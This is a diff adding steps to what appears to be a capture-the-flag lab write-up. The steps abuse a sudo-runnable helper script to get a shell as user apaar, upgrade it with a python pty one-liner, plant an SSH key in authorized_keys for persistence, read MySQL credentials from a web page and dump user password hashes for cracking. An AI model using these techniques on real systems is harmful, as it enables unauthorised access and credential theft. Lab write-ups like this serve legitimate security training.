@@ -125,16 +125,114 @@ $msg 2>/dev/null
 
 echo "Thank you for your precious time!"
 ```
-
+We can run a script as the user apaar.  
 The script seems to read a name and add it to the person variable.  
 Then ask for a msg but never use it. 2>/dev/null
 2=STDERR, so send all errors to nothing (but still executing). 
 
 I send another ping to myself to prove its working. 
 
-![image](https://user-images.githubusercontent.com/5285547/127407467-11686b54-374c-4094-941b-282f44528d54.png)
+![image](https://user-images.githubusercontent.com/5285547/127407943-471032f3-c85b-4f20-a349-11b126a8f88f.png)
 
 Then I try simply /bin/bash for a shell as the user. 
+
+```
+sudo -u apaar /home/apaar/.helpline.sh
+```
+
+![image](https://user-images.githubusercontent.com/5285547/127407970-065246c3-cde0-49d1-a1cd-ac53884cb783.png)
+
+Now we upgrade our terminal.
+
+```
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
+
+## Get ssh access
+
+Now seeing the .ssh/ folder is now writable i can add my ssh public key and just login. 
+
+Kali box
+```
+ssh-keygen
+```
+
+Accept all defaults and then cat the id_rsa.pub key out. 
+
+```
+cat ~/.ssh/id_rsa.pub
+
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDQq4KtSkrifBP5HFkQ+/zrsalHvnsNI1TvefMU92X06G6XN9E2fYajOuLq/0yV1Ak57ohnNQFXSFHQBV9tB0rTFDmhaHCaGuqX+ZSMvSwHwZW32OasxAMnJPbTzSCqli58JN+GdVd81PJPNHnva1Q2WZ/cnvfc<REDACTED>0yFWnTkjx4tAZV+DG27IiOTlJSe2rUFR/eRDI7kN3d2qDiqChI/7F+ld+lqZLEHOhagYSamwGGu0t+0H39COfLX5PfhMBMKKpaaR6FR8AdYvIw6yyoNjNfnnXU2977Cn7m/Zz/l7xy+KYXRng+JBtjDbyg4jXGc=
+```
+
+Then on the attacking machine add it to the authorized_keys file. 
+
+```
+cat <<EOF > authorized_keys
+#paste the key here
+EOF
+```
+
+![image](https://user-images.githubusercontent.com/5285547/127408538-cd099dc8-777f-4a0f-a231-5c92725d0036.png)
+
+Now connect to the ssh
+
+```
+ssh apaar@10.10.44.162 -i ~/.ssh/id_rsa
+```
+
+A much better terminal
+
+![image](https://user-images.githubusercontent.com/5285547/127408800-adc970a3-4cd6-469f-bf57-5dc4a8cecab1.png)
+
+# Enum 2
+
+Checking the rest of the system I saw the username and password for mysql in the index page for login. 
+
+![image](https://user-images.githubusercontent.com/5285547/127409095-e1e33dbb-61a9-4dd6-b013-6c6b0ae5ac53.png)
+
+Using the details we can login and check the databases out. 
+
+![image](https://user-images.githubusercontent.com/5285547/127409156-103b4a38-1509-4f32-8ca5-349837258701.png)
+
+```
+mysql> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
+| webportal          |
++--------------------+
+5 rows in set (0.00 sec)
+
+mysql> use webportal;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> show tables;
++---------------------+
+| Tables_in_webportal |
++---------------------+
+| users               |
++---------------------+
+1 row in set (0.00 sec)
+
+mysql> select * from users;
++----+-----------+----------+-----------+----------------------------------+
+| id | firstname | lastname | username  | password                         |
++----+-----------+----------+-----------+----------------------------------+
+|  1 | Anurodh   | Acharya  | Aurick    | 7e53614ced3640d5de23f111806cc4fd |
+|  2 | Apaar     | Dahal    | cullapaar | 686216240e5af30df0501e53c789a649 |
++----+-----------+----------+-----------+----------------------------------+
+```
+
+Lets see if we can crack the passwords. 
+
+
 
 
 
